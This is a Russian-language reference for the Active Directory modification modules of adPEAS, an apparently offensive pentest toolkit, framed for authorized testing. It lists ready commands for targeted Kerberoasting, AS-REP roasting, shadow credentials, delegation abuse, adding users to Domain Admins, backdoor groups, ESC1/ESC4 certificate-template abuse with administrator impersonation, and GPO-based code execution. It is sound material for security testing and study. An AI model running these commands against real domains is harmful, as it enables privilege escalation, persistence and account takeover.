# Справочник модулей Set- и New- (функции изменения Active Directory)


---

> ## ⚠️ ВАЖНОЕ ЮРИДИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ ⚠️
>
> **ИСПОЛЬЗУЙТЕ ЭТИ МОДУЛИ НА СВОЙ РИСК!**
> 
> Эти модули находятся в ЭКСПЕРИМЕНТАЛЬНОМ состоянии; применяйте их осторожно!
> 
> Использование функций без разрешения **НЕЗАКОННО** и может нарушать:
> - Закон США о компьютерном мошенничестве и злоупотреблениях (CFAA).
> - Закон Великобритании о неправомерном использовании компьютеров (Computer Misuse Act).
> - `202a–c и `303a–b Уголовного кодекса Германии (StGB).
> - Аналогичные законы вашей юрисдикции.
>
> **Обязательно иметь:**
> - Письменное разрешение владельца системы.
> - Действующий договор на проведение тестирования на проникновение.
> - Явно согласованный объём работ, допускающий изменение AD.
>
> **Эти функции предназначены для:**
> - Санкционированного тестирования на проникновение.
> - Авторизованных операций Red Team.
> - Исследования безопасности в лабораторной среде.
> - Согласованной оценки защищённости.
>
> **Авторы НЕ НЕСУТ ОТВЕТСТВЕННОСТИ за неправомерное использование инструментов.**

---

> ## 🧪 ЭКСПЕРИМЕНТАЛЬНЫЙ СТАТУС
>
> Функции `Set-*` и `New-*` в adPEAS продолжают разрабатываться.
> Несмотря на лабораторные испытания, они могут:
>
> - Содержать ошибки, вызывающие непредвиденное поведение.
> - Вызывать нежелательные побочные эффекты при некоторых конфигурациях AD.
> - Некорректно обрабатывать отдельные пограничные случаи или ошибки.
> - Менять поведение между версиями.
>
> **Рекомендации по безопасной работе:**
> - Сначала проверяйте операции в лаборатории.
> - Подготавливайте план отката до внесения изменений.
> - Регистрируйте все изменения для последующей очистки.
> - Используйте `-PassThru`, чтобы подтвердить ожидаемый результат операции.
> - На первом этапе проверяйте некритичные объекты.

---

## Обзор

Модули Set- и New- позволяют изменять Active Directory в ходе согласованных тестов на проникновение и операций Red Team. Они умеют изменять:

- **Учётные записи пользователей** (Set-DomainUser).
- **Учётные записи компьютеров** (Set-DomainComputer).
- **Группы** (Set-DomainGroup).
- **Шаблоны сертификатов** (Set-CertificateTemplate).
- **Запросы сертификатов** (Request-ADCSCertificate).
- **Объекты групповой политики** (Set-DomainGPO).
- **Произвольные объекты AD** (Set-DomainObject).
- **Расположение объектов** (Move-DomainObject) — перемещение или переименование любого объекта.

---

## Set-DomainUser

Изменяет объекты пользователей Active Directory при тестировании повышения привилегий и закрепления доступа.

### Доступные операции

| Операция | Параметр | Описание | Техника атаки |
|-----------|-----------|-------------|------------------|
| **Сброс пароля** | `-NewPassword` | Принудительно сбросить пароль пользователя | Кража учётных данных |
| **Смена пароля** | `-NewPassword -OldPassword` | Сменить пароль (требуется старый) | Штатная смена |
| **Назначить владельца** | `-Owner` | Получить владение объектом пользователя | Злоупотребление ACL |
| **Выдать права** | `-GrantRights -Principal` | Добавить разрешения в ACL | Закрепление доступа |
| **Добавить RBCD** | `-AddRBCD` | Настроить ограниченное делегирование на основе ресурсов | Злоупотребление делегированием |
| **Удалить RBCD** | `-ClearRBCD` | Удалить настройки RBCD | Очистка |
| **Добавить теневые учётные данные** | `-AddShadowCredential` | Добавить msDS-KeyCredentialLink для PKINIT | Shadow Credentials |
| **Очистить теневые учётные данные** | `-ClearShadowCredentials` | Удалить Shadow Credentials | Очистка |
| **Установить SPN** | `-SetSPN` | Добавить имя участника службы SPN | Целевая атака Kerberoasting |
| **Удалить SPN** | `-ClearSPN` | Удалить SPN | Очистка |
| **DontReqPreauth** | `-DontReqPreauth` | Установить флаг DONT_REQ_PREAUTH (UAC 0x400000) | ASREPRoasting |
| **Очистить DontReqPreauth** | `-ClearDontReqPreauth` | Снять флаг DONT_REQ_PREAUTH | Очистка |
| **Включить учётную запись** | `-Enable` | Включить отключённую запись | Закрепление доступа |
| **Отключить учётную запись** | `-Disable` | Отключить учётную запись | Отказ в обслуживании |
| **Разблокировать учётную запись** | `-Unlock` | Разблокировать заблокированную запись | Восстановление доступа |
| **Пароль не обязателен** | `-PasswordNotRequired` | Установить флаг PASSWD_NOTREQD (UAC 0x0020) | Ослабление защиты учётной записи |
| **Снять «пароль не обязателен»** | `-ClearPasswordNotRequired` | Снять флаг PASSWD_NOTREQD | Очистка |
| **Обратимое шифрование** | `-ReversibleEncryption` | Установить флаг ENCRYPTED_TEXT_PWD_ALLOWED (UAC 0x0080) | Кража учётных данных |
| **Отключить обратимое шифрование** | `-ClearReversibleEncryption` | Снять флаг ENCRYPTED_TEXT_PWD_ALLOWED | Очистка |
| **Пароль бессрочен** | `-PasswordNeverExpires` | Установить флаг DONT_EXPIRE_PASSWORD (UAC 0x10000) | Закрепление доступа |
| **Снять бессрочность пароля** | `-ClearPasswordNeverExpires` | Снять флаг DONT_EXPIRE_PASSWORD | Очистка |
| **Требовать смарт-карту** | `-SmartcardRequired` | Установить флаг SMARTCARD_REQUIRED (UAC 0x40000) | Блокирование учётной записи |
| **Отменить требование смарт-карты** | `-ClearSmartcardRequired` | Снять флаг SMARTCARD_REQUIRED | Очистка |
| **Запретить делегирование** | `-NotDelegated` | Установить флаг NOT_DELEGATED (UAC 0x100000) | Защита / очистка |
| **Снять запрет делегирования** | `-ClearNotDelegated` | Снять флаг NOT_DELEGATED | Очистка |
| **Пароль истёк** | `-PasswordExpired` | Потребовать смену пароля при следующем входе (pwdLastSet = 0) | Нарушение доступа |
| **Отменить истечение пароля** | `-ClearPasswordExpired` | Завершить состояние истечения (pwdLastSet = 0, затем -1 — DC запишет текущее время) | Очистка |

### Синтаксис

```powershell
Set-DomainUser
    -Identity <String>
    [-NewPassword <String>]
    [-OldPassword <String>]
    [-Owner <String>]
    [-GrantRights <String>] [-Principal <String>]
    [-AddRBCD <String>]
    [-ClearRBCD] [-Principal <String>] [-Force]
    [-AddShadowCredential] [-DeviceID <String>]
    [-ClearShadowCredentials] [-DeviceID <String>] [-Force]
    [-SetSPN <String>]
    [-ClearSPN <String>] [-Force]
    [-DontReqPreauth] [-ClearDontReqPreauth]
    [-Enable]
    [-Disable]
    [-Unlock]
    [-PasswordNotRequired] [-ClearPasswordNotRequired]
    [-ReversibleEncryption] [-ClearReversibleEncryption]
    [-PasswordNeverExpires] [-ClearPasswordNeverExpires]
    [-SmartcardRequired] [-ClearSmartcardRequired]
    [-NotDelegated] [-ClearNotDelegated]
    [-PasswordExpired] [-ClearPasswordExpired]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Примеры

```powershell
# Целевой Kerberoasting: добавить пользователю SPN
Set-DomainUser -Identity "serviceaccount" -SetSPN "HTTP/fakeservice.contoso.com"
# Теперь учётная запись допускает Kerberoasting!

# ASREPRoasting: отключить предварительную аутентификацию
Set-DomainUser -Identity "targetuser" -DontReqPreauth
# Теперь AS-REP-хеш можно получить без аутентификации!

# Shadow Credentials: добавить сертификат PKINIT
Set-DomainUser -Identity "targetuser" -AddShadowCredential
# Возвращается PFX-сертификат для аутентификации!

# RBCD: настроить делегирование
Set-DomainUser -Identity "targetuser" -AddRBCD "YOURCOMPUTER$"
# YOURCOMPUTER$ теперь может выдавать пользователей за себя при доступе к targetuser!

# Принудительно сбросить пароль (нужно право ResetPassword)
Set-DomainUser -Identity "targetuser" -NewPassword "NewP@ssw0rd!"

# Включить отключённую учётную запись
Set-DomainUser -Identity "disableduser" -Enable

# Очистка: удалить SPN
Set-DomainUser -Identity "serviceaccount" -ClearSPN "HTTP/fakeservice.contoso.com"

# Очистка: снова включить предварительную аутентификацию
Set-DomainUser -Identity "targetuser" -ClearDontReqPreauth

# Флаги UAC: разрешить пустой пароль
Set-DomainUser -Identity "targetuser" -PasswordNotRequired

# Флаги UAC: пароль без срока действия (закрепление доступа)
Set-DomainUser -Identity "backdooruser" -PasswordNeverExpires

# Флаги UAC: включить обратимое шифрование (кража учётных данных)
Set-DomainUser -Identity "targetuser" -ReversibleEncryption

# Флаги UAC: пометить учётную запись как чувствительную (защитная мера)
Set-DomainUser -Identity "adminuser" -NotDelegated

# Очистка: снять флаги UAC
Set-DomainUser -Identity "targetuser" -ClearPasswordNotRequired
Set-DomainUser -Identity "backdooruser" -ClearPasswordNeverExpires
Set-DomainUser -Identity "targetuser" -ClearReversibleEncryption
Set-DomainUser -Identity "adminuser" -ClearNotDelegated
```

---

## Set-DomainComputer

Изменяет объекты компьютеров в Active Directory для тестирования делегирования и закрепления доступа.

### Доступные операции

| Операция | Параметр | Описание | Техника атаки |
|-----------|-----------|-------------|------------------|
| **Добавить RBCD** | `-AddRBCD` | Настроить ограниченное делегирование на основе ресурсов | Атака RBCD |
| **Очистить RBCD** | `-ClearRBCD` | Удалить настройки RBCD | Очистка |
| **Назначить владельца** | `-Owner` | Получить владение объектом компьютера | Злоупотребление ACL |
| **Выдать права** | `-GrantRights -Principal` | Добавить разрешения ACL | Закрепление доступа |
| **Добавить теневые учётные данные** | `-AddShadowCredential` | Добавить msDS-KeyCredentialLink | Shadow Credentials |
| **Очистить теневые учётные данные** | `-ClearShadowCredentials` | Удалить Shadow Credentials | Очистка |
| **Включить учётную запись** | `-Enable` | Включить отключённый компьютер | Закрепление доступа |
| **Отключить учётную запись** | `-Disable` | Отключить учётную запись компьютера | Отказ в обслуживании |
| **Установить неограниченное делегирование** | `-SetTrustedForDelegation` | Разрешить неограниченное делегирование | Злоупотребление делегированием |
| **Очистить неограниченное делегирование** | `-ClearTrustedForDelegation` | Запретить неограниченное делегирование | Очистка |
| **Установить ограниченное делегирование** | `-SetConstrainedDelegation` | Настроить SPN для ограниченного делегирования | Злоупотребление делегированием |
| **Очистить ограниченное делегирование** | `-ClearConstrainedDelegation` | Удалить ограниченное делегирование | Очистка |
| **Включить переход протокола** | `-SetTrustedToAuthForDelegation` | Разрешить S4U2Self | Злоупотребление делегированием |
| **Отключить переход протокола** | `-ClearTrustedToAuthForDelegation` | Запретить S4U2Self | Очистка |
| **Пароль не обязателен** | `-PasswordNotRequired` | Установить флаг PASSWD_NOTREQD (UAC 0x0020) | Ослабление защиты учётной записи |
| **Пароль бессрочен** | `-PasswordNeverExpires` | Установить флаг DONT_EXPIRE_PASSWORD (UAC 0x10000) | Закрепление доступа |
| **Запретить делегирование** | `-NotDelegated` | Установить флаг NOT_DELEGATED (UAC 0x100000) | Защита / очистка |
| **Снять запрет делегирования** | `-ClearNotDelegated` | Снять флаг NOT_DELEGATED (UAC 0x100000) | Возобновление делегирования |
| **Отключить предварительную аутентификацию** | `-DontReqPreauth` | Установить флаг DONT_REQ_PREAUTH (UAC 0x400000) | AS-REP Roasting |
| **Включить предварительную аутентификацию** | `-ClearDontReqPreauth` | Снять флаг DONT_REQ_PREAUTH (UAC 0x400000) | Очистка |

### Синтаксис

```powershell
Set-DomainComputer
    -Identity <String>
    [-AddRBCD <String>]
    [-ClearRBCD] [-Principal <String>] [-Force]
    [-Owner <String>]
    [-GrantRights <String>] [-Principal <String>]
    [-AddShadowCredential] [-DeviceID <String>]
    [-ClearShadowCredentials] [-DeviceID <String>] [-Force]
    [-Enable]
    [-Disable]
    [-SetTrustedForDelegation]
    [-ClearTrustedForDelegation]
    [-SetConstrainedDelegation <String[]>]
    [-ClearConstrainedDelegation] [-Principal <String>] [-Force]
    [-SetTrustedToAuthForDelegation]
    [-ClearTrustedToAuthForDelegation]
    [-PasswordNotRequired]
    [-PasswordNeverExpires]
    [-NotDelegated]
    [-ClearNotDelegated]
    [-DontReqPreauth]
    [-ClearDontReqPreauth]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Примеры

```powershell
# RBCD: настроить делегирование на контроллер домена
Set-DomainComputer -Identity "DC01" -AddRBCD "YOURCOMPUTER$"
# YOURCOMPUTER$ теперь может выдавать себя за пользователей перед DC01!

# Shadow Credentials на компьютере
Set-DomainComputer -Identity "FILESERVER01" -AddShadowCredential
# Возвращается PFX-сертификат для аутентификации компьютера!

# Неограниченное делегирование (ВЫСОКОЕ ВЛИЯНИЕ!)
Set-DomainComputer -Identity "YOURCOMPUTER$" -SetTrustedForDelegation
# Компьютер теперь может выступать от имени ЛЮБОГО пользователя в ЛЮБОЙ службе!

# Ограниченное делегирование для заданных SPN
Set-DomainComputer -Identity "YOURCOMPUTER$" -SetConstrainedDelegation @("cifs/dc01.contoso.com", "ldap/dc01.contoso.com")
# Компьютер может делегировать полномочия этим службам.

# Переход протокола (S4U2Self)
Set-DomainComputer -Identity "YOURCOMPUTER$" -SetTrustedToAuthForDelegation
# Компьютер может получать сервисные билеты без учётных данных пользователя!

# Включить отключённый компьютер
Set-DomainComputer -Identity "DISABLEDPC" -Enable

# Очистка: удалить RBCD
Set-DomainComputer -Identity "DC01" -ClearRBCD -Force

# Очистка: отключить неограниченное делегирование
Set-DomainComputer -Identity "YOURCOMPUTER$" -ClearTrustedForDelegation

# UAC: разрешить пустой пароль учётной записи компьютера
Set-DomainComputer -Identity "YOURCOMPUTER$" -PasswordNotRequired

# UAC: пароль бессрочен (закрепление доступа)
Set-DomainComputer -Identity "YOURCOMPUTER$" -PasswordNeverExpires

# UAC: отключить предварительную аутентификацию (AS-REP Roasting для компьютера)
Set-DomainComputer -Identity "YOURCOMPUTER$" -DontReqPreauth

# UAC: пометить запись как чувствительную и запретить делегирование (защита)
Set-DomainComputer -Identity "DC01" -NotDelegated

# Очистка: снова включить предварительную аутентификацию
Set-DomainComputer -Identity "YOURCOMPUTER$" -ClearDontReqPreauth

# Очистка: удалить защиту NOT_DELEGATED
Set-DomainComputer -Identity "DC01" -ClearNotDelegated
```

### Цепочка атаки с делегированием

```
1. Create computer account (New-DomainComputer)
        ↓
2. Configure RBCD on target (Set-DomainComputer -AddRBCD)
        ↓
3. Request TGT for created computer (Invoke-KerberosAuth)
        ↓
4. S4U2Self: Get service ticket as any user
        ↓
5. S4U2Proxy: Delegate to target service
        ↓
6. Impersonate Domain Admin to target!
```

---

## Set-DomainGroup

Изменяет группы Active Directory при тестировании повышения привилегий.

### Доступные операции

| Операция | Параметр | Описание | Техника атаки |
|-----------|-----------|-------------|------------------|
| **Добавить участника** | `-AddMember` | Добавить пользователя или компьютер в группу | Повышение привилегий |
| **Удалить участника** | `-RemoveMember` | Удалить участника из группы | Очистка |
| **Очистить участников** | `-ClearMembers -Force` | Удалить ВСЕХ участников | Отказ в обслуживании |
| **Установить описание** | `-SetDescription` | Задать описание группы | Маскировка |
| **Очистить описание** | `-ClearDescription` | Удалить описание | Очистка |
| **Преобразовать в группу безопасности** | `-ConvertToSecurity` | Группа рассылки → группа безопасности | Разрешить использование в ACL |
| **Преобразовать в группу рассылки** | `-ConvertToDistribution` | Группа безопасности → группа рассылки | Отключить действие группы |
| **Назначить владельца** | `-Owner` | Получить владение группой | Злоупотребление ACL |
| **Выдать права** | `-GrantRights -Principal` | Добавить разрешения ACL | Закрепление доступа |

### Синтаксис

```powershell
Set-DomainGroup
    -Identity <String>
    [-AddMember <String[]>]
    [-RemoveMember <String[]>]
    [-ClearMembers] [-Force]
    [-SetDescription <String>]
    [-ClearDescription]
    [-ConvertToSecurity]
    [-ConvertToDistribution]
    [-Owner <String>]
    [-GrantRights <String>] [-Principal <String>]
    [-PassThru]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Примеры

```powershell
# Добавить пользователя в Domain Admins (нужно право WriteMembers)
Set-DomainGroup -Identity "Domain Admins" -AddMember "eviluser"
# Теперь пользователь входит в Domain Admins!

# Добавить нескольких участников
Set-DomainGroup -Identity "Backup Operators" -AddMember @("user1", "user2", "computer1$")

# Удалить участника группы
Set-DomainGroup -Identity "Domain Admins" -RemoveMember "eviluser"

# Очистить ВСЕХ участников (разрушающая операция!)
Set-DomainGroup -Identity "IT-Support" -ClearMembers -Force
# Группа теперь пуста!

# Установить описание для маскировки
Set-DomainGroup -Identity "Backdoor-Group" -SetDescription "Legitimate IT Support Group"

# Преобразовать группу рассылки в группу безопасности (для ACL)
Set-DomainGroup -Identity "MailGroup" -ConvertToSecurity
# Группу теперь можно назначать в разрешениях!

# «Обезвредить» группу безопасности, преобразовав её в группу рассылки
Set-DomainGroup -Identity "Domain Admins" -ConvertToDistribution
# Группу больше нельзя использовать для назначения прав!
# ВНИМАНИЕ: это крайне разрушительная операция!

# Получить владение группой
Set-DomainGroup -Identity "Domain Admins" -Owner "CONTOSO\attacker"

# Выдать право WriteMembers
Set-DomainGroup -Identity "Domain Admins" -GrantRights WriteMembers -Principal "CONTOSO\attacker"
```

### Значения типа группы

| Тип | Значение groupType | Описание |
|------|-----------------|-------------|
| Глобальная группа безопасности | -2147483646 (0x80000002) | Группа безопасности по умолчанию |
| Локальная группа безопасности домена | -2147483644 (0x80000004) | Действует в пределах домена |
| Универсальная группа безопасности | -2147483640 (0x80000008) | Действует по всему лесу |
| Глобальная группа рассылки | 2 (0x2) | Только почта, без ACL |
| Локальная группа рассылки домена | 4 (0x4) | Только почта, область домена |
| Универсальная группа рассылки | 8 (0x8) | Только почта, область леса |

---

## Set-CertificateTemplate

Изменяет шаблоны сертификатов AD CS для оценки уязвимостей ESC.

### Доступные операции

| Операция | Параметр | Описание | Техника атаки |
|-----------|-----------|-------------|------------------|
| **Разрешить субъект от заявителя** | `-AllowEnrolleeSuppliesSubject` | Включить CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT | ESC1 |
| **Добавить аутентификацию клиента** | `-AddClientAuthentication` | Добавить EKU Client Authentication | ESC1/ESC2 |
| **Разрешить экспорт ключа** | `-AllowExportableKey` | Разрешить экспорт ключа | Кража ключей |
| **Убрать одобрение руководителя** | `-RemoveManagerApproval` | Отключить требование одобрения | ESC1 |
| **Выдать право получения сертификата** | `-GrantEnrollment` | Предоставить разрешение Enroll | ESC4 |
| **Выдать полный контроль** | `-GrantFullControl` | Предоставить GenericAll | ESC4 |
| **Выдать право записи** | `-GrantWrite` | Предоставить WriteProperty | ESC4 |
| **Отозвать право получения сертификата** | `-RevokeEnrollment` | Удалить разрешение Enroll | Очистка |
| **Запретить субъект от заявителя** | `-DisableEnrolleeSuppliesSubject` | Восстановить выдачу имени субъекта центром сертификации | Очистка |
| **Вернуть одобрение руководителя** | `-AddManagerApproval` | Включить обязательное одобрение | Очистка |
| **Удалить EKU** | `-RemoveEKU` | Удалить указанный EKU | Очистка |
| **Добавить EKU Any Purpose** | `-AddAnyPurposeEKU` | Добавить Any Purpose (2.5.29.37.0) | ESC2 |
| **Очистить EKU** | `-ClearEKUs` | Удалить все EKU | ESC2 |
| **Добавить вход со смарт-картой** | `-AddSmartcardLogon` | Добавить EKU Smartcard Logon | PKINIT |
| **Назначить владельца** | `-SetOwner` | Получить владение | ESC4 |
| **Выдать автозачисление** | `-GrantAutoEnroll` | Предоставить право автоматической регистрации | Закрепление доступа |
| **Экспорт** | `-Export` | Резервная копия шаблона в JSON | Резервирование |
| **Импорт** | `-Import` | Восстановить шаблон из резервного JSON | Восстановление |

### Синтаксис

```powershell
Set-CertificateTemplate
    -Identity <String>
    [-AllowEnrolleeSuppliesSubject]
    [-AddClientAuthentication]
    [-AllowExportableKey]
    [-RemoveManagerApproval]
    [-GrantEnrollment <String>]
    [-GrantFullControl <String>]
    [-GrantWrite <String>]
    [-RevokeEnrollment <String>]
    [-DisableEnrolleeSuppliesSubject]
    [-AddManagerApproval]
    [-RemoveEKU <String>]
    [-AddAnyPurposeEKU]
    [-ClearEKUs]
    [-AddSmartcardLogon]
    [-SetOwner <String>]
    [-GrantAutoEnroll <String>]
    [-Export <String>]
    [-Import <String>]
    [-Domain <String>]
    [-Server <String>]
    [-Credential <PSCredential>]
```

### Примеры

```powershell
# ESC1: сделать шаблон уязвимым
Set-CertificateTemplate -Identity "WebServer" -AllowEnrolleeSuppliesSubject -AddClientAuthentication -RemoveManagerApproval
# Теперь шаблон уязвим к ESC1!

# ESC2: добавить EKU Any Purpose
Set-CertificateTemplate -Identity "User" -AddAnyPurposeEKU
# Сертификат можно использовать для любого назначения!

# ESC4: выдать право Enroll пользователю с низкими привилегиями
Set-CertificateTemplate -Identity "DomainController" -GrantEnrollment "CONTOSO\LowPrivUser"
# Теперь пользователь может запросить сертификат по шаблону DC!

# Добавить EKU Smartcard Logon для PKINIT
Set-CertificateTemplate -Identity "SmartcardUser" -AddSmartcardLogon

# Сделать резервную копию шаблона до изменения
Set-CertificateTemplate -Identity "WebServer" -Export "C:\Backup\WebServer.json"

# Восстановить шаблон из резервной копии
Set-CertificateTemplate -Import "C:\Backup\WebServer.json"

# Очистка: отменить изменения ESC1
Set-CertificateTemplate -Identity "WebServer" -DisableEnrolleeSuppliesSubject -AddManagerApproval

# Очистка: отозвать право Enroll
Set-CertificateTemplate -Identity "WebServer" -RevokeEnrollment "CONTOSO\TestUser"
```

### Матрица атак ESC

| ESC | Уязвимость | Параметр |
|-----|---------------|-----------|
| ESC1 | Имя субъекта задаёт заявитель + EKU Client Auth | `-AllowEnrolleeSuppliesSubject -AddClientAuthentication` |
| ESC2 | EKU Any Purpose | `-AddAnyPurposeEKU` |
| ESC2 | Отсутствуют EKU | `-ClearEKUs` |
| ESC4 | Уязвимый ACL | `-GrantEnrollment`, `-GrantFullControl` |

---

## Request-ADCSCertificate

Запрашивает сертификат у центра сертификации AD CS через веб-регистрацию `/certsrv/`. Формирует запрос PKCS#10 (CSR), отправляет его, получает выпущенный сертификат и сохраняет в PFX. Поддерживает тестирование ESC1 и ESC4.

### Доступные операции

| Операция                | Параметр                           | Описание                                   | Техника атаки       |
| ------------------------ | ----------------------------------- | --------------------------------------------- | ---------------------- |
| **Обычная заявка**        | `-TemplateName`                     | Запрос сертификата по шаблону              | Выдача сертификата |
| **Запрос от имени пользователя**     | `-Impersonate "admin@contoso.com"`  | Запрос на имя другого пользователя (UPN в SAN) | ESC1 |
| **Запрос от имени компьютера** | `-Impersonate "srv-dc.contoso.com"` | Запрос с DNS в SAN              | ESC1 |
| **Свой Subject/SAN**   | `-Subject -UPN -DNS`                | Явное управление субъектом и SAN                | ESC1 |
| **Изменить шаблон**      | `-ModifyTemplate`                   | Временно изменить шаблон для проверки         | ESC4 |
| **Без пароля**          | `-NoPassword`                       | Экспорт PFX без парольной защиты        | Упрощение             |

### Синтаксис

```powershell
Request-ADCSCertificate
    -TemplateName <String>
    [-CAServer <String>]
    [-Impersonate <String>]
    [-Subject <String>]
    [-UPN <String>]
    [-DNS <String[]>]
    [-AlternativeNames <String[]>]
    [-KeyLength <Int> {1024|2048|4096}]
    [-OutputPath <String>]
    [-Credential <PSCredential>]
    [-ModifyTemplate]
    [-UseHTTP]
    [-NoPassword]
    [-PassThru]
    [-Force]
    [-Domain <String>]
    [-Server <String>]
```

### Параметры

| Параметр | Тип | Описание |
|-----------|------|-------------|
| `-TemplateName` | String | Имя шаблона сертификата (например, "User" или "WebServer") |
| `-CAServer` | String | FQDN сервера УЦ; при отсутствии автоматически определяется из AD |
| `-Impersonate` | String | Имя, UPN или FQDN, под которым запрашивается сертификат; Subject и SAN вычисляются автоматически |
| `-Subject` | String | Имя субъекта; префикс "CN=" автоматически добавляется при отсутствии |
| `-UPN` | String | Имя UPN в SAN (например, "admin@contoso.com") |
| `-DNS` | String[] | DNS-имена узлов в SAN (например, "dc01.contoso.com") |
| `-KeyLength` | Int | Длина RSA-ключа в битах; по умолчанию 2048 |
| `-OutputPath` | String | Путь к PFX; по умолчанию формируется на основе субъекта |
| `-Credential` | PSCredential | Учётные данные для HTTP-аутентификации к certsrv |
| `-ModifyTemplate` | Switch | ESC4: временное изменение шаблона, запрос сертификата и восстановление |
| `-UseHTTP` | Switch | Использовать HTTP вместо HTTPS для certsrv |
| `-NoPassword` | Switch | Экспортировать PFX без парольной защиты |
| `-PassThru` | Switch | Вернуть объект результата вместо вывода в консоль |
| `-Force` | Switch | Перезаписать существующий PFX без запроса подтверждения |

### Автообнаружение центра сертификации

Если `-CAServer` не задан, `Request-ADCSCertificate` автоматически:

1. Находит все центры сертификации через Active Directory.
2. Отбирает УЦ, публикующие нужный шаблон.
3. Проверяет доступность (сначала HTTPS, затем HTTP).
4. При недоступности первого УЦ пробует следующий.

### Удобный параметр -Impersonate

`-Impersonate` поддерживает три формата и автоматически определяет Subject и SAN:

| Ввод | Определяется как | Subject | SAN |
|-------|-------------|---------|-----|
| `"administrator"` | Имя пользователя | CN=administrator | UPN:administrator@contoso.com |
| `"admin@contoso.com"` | UPN | CN=admin | UPN:admin@contoso.com |
| `"srv-dc.contoso.com"` | FQDN | CN=srv-dc | DNS:srv-dc.contoso.com |

### Примеры

```powershell
# Обычная регистрация с автоматическим обнаружением УЦ
Request-ADCSCertificate -TemplateName "User"

# ESC1: запрос сертификата на имя Administrator
Request-ADCSCertificate -TemplateName "VulnTemplate" -Impersonate "administrator"

# ESC1: явно указать Subject и UPN в SAN
Request-ADCSCertificate -TemplateName "VulnTemplate" -Subject "Administrator" -UPN "administrator@contoso.com"

# ESC1: сертификат компьютера с DNS в SAN
Request-ADCSCertificate -TemplateName "Machine" -Impersonate "dc01.contoso.com"

# ESC4: временно изменить шаблон, запросить сертификат и восстановить
Request-ADCSCertificate -TemplateName "WebServer" -ModifyTemplate -Impersonate "administrator"

# Указать сервер УЦ и учётные данные явно
Request-ADCSCertificate -CAServer "ca01.contoso.com" -TemplateName "User" -Credential (Get-Credential)

# PFX без пароля (удобно для последующих команд)
Request-ADCSCertificate -TemplateName "User" -NoPassword

# Использование `-PassThru` в сценарии
$result = Request-ADCSCertificate -TemplateName "VulnTemplate" -Impersonate "admin" -PassThru
Connect-adPEAS -Domain "contoso.com" -Certificate $result.PFXPath -CertificatePassword $result.PFXPassword
```

### Последовательность ESC4 (-ModifyTemplate)

Параметр `-ModifyTemplate` автоматизирует полную цепочку проверки ESC4:

```
1. Сохранить резервную копию шаблона в JSON
        ↓
2. Изменить шаблон:
   - AllowEnrolleeSuppliesSubject (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
   - AddClientAuthentication EKU
   - AllowExportableKey
   - RemoveManagerApproval
        ↓
3. Запросить сертификат с заданными Subject/SAN
        ↓
4. Восстановить исходный шаблон из копии (всегда, даже при ошибке)
```

Требует WriteDACL, WriteProperty либо GenericAll на объекте шаблона. Файл резервной копии сохраняется после восстановления для аудита.

### Пример консольного вывода

```
[*] Found 2 Certificate Authority(ies) in Active Directory
[*] Auto-discovered CA: Contoso-CA (ca01.contoso.com)
[*] Requesting certificate from CA 'ca01.contoso.com' using template 'VulnTemplate'
[*] Generated 2048-bit RSA key pair and PKCS#10 CSR
[+] Certificate issued (Request ID: 42)
[+] Certificate saved as PFX:
    PFX Path:                                    administrator_20260219_120000.pfx
    PFX Password:                                K8#mP2@xL9!nQ4$wR7
    Thumbprint:                                  3F2B1C...
    Subject:                                     CN=administrator
    Issuer:                                      CN=Contoso-CA
    Valid Until:                                 2027-02-19
    Template:                                    VulnTemplate
    SAN:                                         Other Name:Principal Name=administrator@contoso.com

[*] Usage with Connect-adPEAS:
    Connect-adPEAS -Domain contoso.com -Certificate 'administrator_20260219_120000.pfx' -CertificatePassword 'K8#mP2@xL9!nQ4$wR7'
```

### Результат (-PassThru)

```powershell
[PSCustomObject]@{
    Success     = $true
    Status      = 'Issued'
    RequestID   = 42
    PFXPath     = "administrator_20260219_120000.pfx"
    PFXPassword = "K8#mP2@xL9!nQ4$wR7"
    Thumbprint  = "3F2B1C..."
    Subject     = "CN=administrator"
    Issuer      = "CN=Contoso-CA"
    Template    = "VulnTemplate"
    CAServer    = "ca01.contoso.com"
}
```

---

## Set-DomainGPO

Изменяет объекты групповой политики для проверки закрепления доступа и повышения привилегий.

### Доступные операции

| Операция | Параметр | Описание | Техника атаки |
|-----------|-----------|-------------|------------------|
| **Привязать GPO** | `-LinkTo` | Привязать GPO к OU/домену | Применение политики |
| **Отвязать GPO** | `-UnlinkFrom` | Удалить привязку GPO | Очистка |
| **Назначить владельца** | `-Owner` | Получить владение | Злоупотребление ACL |
| **Выдать права** | `-GrantRights -Principal` | Добавить разрешения ACL | Закрепление доступа |
| **Добавить запланированное задание** | `-AddScheduledTask` | Создать немедленное задание через GPO | Выполнение кода |
| **Добавить участника локальной группы** | `-AddLocalGroupMember` | Добавить пользователя в локальную группу через GPO | Локальный администратор |
| **Добавить сценарий запуска** | `-AddStartupScript` | Развернуть сценарий запуска компьютера | Закрепление доступа |
| **Добавить сценарий входа** | `-AddLogonScript` | Развернуть сценарий входа пользователя | Закрепление доступа |
| **Добавить службу** | `-AddService` | Установить службу Windows через GPO | Закрепление доступа |
| **Развернуть файл** | `-DeployFile` | Копировать файл через GPO | Доставка содержимого |
| **Добавить правило брандмауэра** | `-AddFirewallRule` | Создать правило брандмауэра через GPO | Сетевой доступ |
| **Синхронизировать SYSVOL** | `-SyncSYSVOL` | Синхронизировать разрешения AD и SYSVOL | Исправление разрешений |
| **Экспорт (резервная копия)** | `-Export` | Снимок GPO (атрибуты AD и полное дерево SYSVOL) в JSON | Резервирование перед изменениями |
| **Импорт (восстановление)** | `-Import` | Восстановить GPO из JSON-копии на сервере | Очистка |
| **Удалить запланированное задание** | `-RemoveScheduledTask -TaskName` | Точечно удалить добавленное задание | Очистка |
| **Удалить участника локальной группы** | `-RemoveLocalGroupMember -LocalGroup -MemberToAdd` | Удалить добавленного участника | Очистка |
| **Удалить службу** | `-RemoveService -ServiceName` | Удалить добавленную службу | Очистка |
| **Удалить развёрнутый файл** | `-RemoveDeployedFile -FileName` | Удалить развёрнутый файл | Очистка |
| **Удалить правило брандмауэра** | `-RemoveFirewallRule -RuleName` | Удалить добавленное правило | Очистка |
| **Удалить сценарий запуска** | `-RemoveStartupScript -ScriptName` | Удалить добавленный сценарий запуска | Очистка |
